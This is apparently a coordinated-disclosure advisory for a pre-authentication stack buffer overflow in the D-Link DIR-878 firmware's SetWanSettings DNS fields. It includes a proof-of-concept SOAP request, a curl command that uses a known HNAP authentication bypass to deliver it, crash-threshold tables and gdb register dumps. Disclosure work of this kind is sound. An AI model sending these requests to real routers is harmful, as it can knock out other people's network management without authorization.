# D-Link DIR-878 SetWanSettings (wan0) ConfigDNS Stack-based Buffer Overflow — Static & DHCP Branches

> **Status:** CVE: Not assigned (identifier requested). Vendor notification: pending. Repository published for coordinated disclosure.

## Summary

A stack-based buffer overflow vulnerability was discovered in D-Link DIR-878 (REV A) firmware
v1.20B05. In the `SetWanSettings` HNAP handler (default `WANID` = wan0), both the **Static** and
the **DHCP** branch helpers concatenate the user-controlled `ConfigDNS/Primary` and
`ConfigDNS/Secondary` fields into a **64-byte stack buffer** via `sprintf(buf,"%s ",Primary)` +
`strcat(buf,Secondary)` — *before* any IP-format validation takes place. A `Primary` value of
about 164 bytes overwrites the saved return address. The handler is designed to require an HNAP
session, but the firmware's HNAP authentication can be bypassed by previously disclosed means
(CVE-2020-15633 class: `POST /HNAP1/?GetCAPTCHAsetting` carrying an arbitrary `SOAPAction`,
verified working on v1.20B05), so the issue is reachable **pre-authentication**.

## Affected Product

- Vendor: D-Link
- Product: DIR-878, Hardware Revision A
- Firmware: v1.20B05 (verified). The product is EoL/EoS; later v1.30B08 hotfix builds share the
  same HNAP codebase lineage but were not individually re-verified.

## Vulnerability Details

- Type: Stack-based Buffer Overflow — CWE-121
- Component: `bin/prog.cgi` (HNAP/FastCGI main handler)
- Sink functions: `FUN_00462aa0` (Static branch helper), `FUN_0046342c` (DHCP branch helper);
  dispatch in `FUN_00464680`

### Root Cause

Both branch helpers build the DNS server list as:

```c
char buf[64];
sprintf(buf, "%s ", Primary);   /* attacker-controlled, unbounded */
strcat(buf, Secondary);         /* attacker-controlled, unbounded */
```

The concatenation happens **before** the `tbsCheckIp` legitimacy check, so `Primary`/`Secondary`
do not need to be valid IP addresses — over-long input crashes regardless. Stack-frame geometry:
64-byte buffer + 104-byte adjacent scratch buffer → saved return address at ≈ offset 164, matching
the observed crash threshold.

### Distinction from known CVEs

The same "DNS concatenation overflow" pattern is instantiated per WAN interface in this firmware:
wan3/Static is CVE-2026-90693 (already public), wan2 is covered by an embargoed entry (excluded
from this research by convention). **wan0 — the default WAN interface reached when `WANID` is
omitted — has no CVE coverage**, and both its Static and DHCP branch helpers carry the defect
independently. The CVE-2022-4656x family (e.g. CVE-2022-46561/-46560/-46570) concerns the
`Password` field of `SetWanSettings2/SetWanSettings3` on firmware 1.30B08 — different parameters,
different sinks.

## Proof of Concept (non-destructive)

Control request (short values — observed `SetWanSettingsResult>OK`, process survives):

```xml
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetWanSettings xmlns="http://purenetworks.com/HNAP1/"><Type>Static</Type><ConfigDNS><Primary>1.1.1.1</Primary><Secondary>2.2.2.2</Secondary></ConfigDNS><MTU>1500</MTU><IPAddress>10.0.0.2</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.0.0.1</Gateway><MacAddress>00:11:22:33:44:55</MacAddress></SetWanSettings></soap:Body></soap:Envelope>
```

Attack request: identical, with `Primary` = 200 × "A". Send with the HNAP bypass header:

```bash
curl -s -X POST 'http://<router>/HNAP1/?GetCAPTCHAsetting' \
  -H 'SOAPAction: "http://purenetworks.com/HNAP1/SetWanSettings"' \
  -H 'Content-Type: text/xml' --data-binary @attack.xml
# Observed: HTTP 500; lighttpd log "child signaled: 11" (SIGSEGV) + core dump.
```

Differential matrix (Static branch):

| Primary | Result | Process fate | Interpretation |
|---|---|---|---|
| `1.1.1.1` | `OK` | alive; nvram updated | baseline |
| "A"×32 | `XMLDB_FORMAT_ERROR` | alive | overflow < 64B buffer |
| "A"×96 / ×120 | `XMLDB_FORMAT_ERROR` | alive | overflow into adjacent scratch buffer |
| "A"×160 | no response | CPU spin (anomalous control flow) | partial overwrite of saved area |
| "A"×164 / ×172 / ×176 | 500 | **SIGSEGV + core** | saved ra fully overwritten |
| "A"×200 | 500 | SIGSEGV + core + gdb capture | register forensics below |

DHCP branch (`FUN_0046342c`): control `1.1.1.1` → `OK`; "A"×200 → 500 + core.

### gdb register forensics (Static, Primary = "A"×200)

Captured via `qemu-mipsel-static -g 1234` + gdb-multiarch at crash time:

```
pc = 0x2bca5ed8    uClibc strcat+0x28 (base 0x2bc70000, symbol offset 0x35eb0)
ra = 0x00462b84    return site of jalr strcat inside FUN_00462aa0
a1 = 0x41414141
t1–t7 = 0x41414141  strcat word-load loop registers saturated with attacker bytes
```

The crash occurs inside `strcat` (dereferencing corrupted state); attacker bytes saturate the CPU
registers involved in the copy loop. Return-address overwrite is confirmed by the differential
threshold; redirecting execution (RCE) was **not** developed and is not claimed as proven.

**Cleanup:** the attack writes the `wan_wan0_dns` nvram key only in the non-crashing control case
(set it back to normal values or reboot); crash cases leave no persistent change. The FastCGI
worker is restarted automatically.

## Impact

- Attacker profile: unauthenticated (via the known HNAP bypass), adjacent network.
- Proven impact: pre-authentication crash of the web management handler (denial of service),
  repeatable; the saved return address is reached at ≈164 bytes and attacker bytes enter CPU
  registers, so code execution is plausible with further exploitation work (not developed).

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **6.5** (Medium)

Scored on the proven pre-authentication crash. The register-level evidence indicates a higher
exploitation ceiling, but the score reflects observed impact only.

## Discovery

Discovered by Zimo-666 on 2026-10-12 via static reverse engineering plus dynamic differential
testing with gdb register forensics in a qemu-user rehosting environment.
Vendor notified: pending.

---

## Repository files

| File | Content |
|---|---|
| `README.md` | This advisory |
| `poc.sh` | Non-destructive reproduction script, derived from the request recorded above |

> The script reproduces the HTTP request documented in this advisory. It is not a substitute for
> the recorded test evidence; the observed outputs quoted above are the evidence.
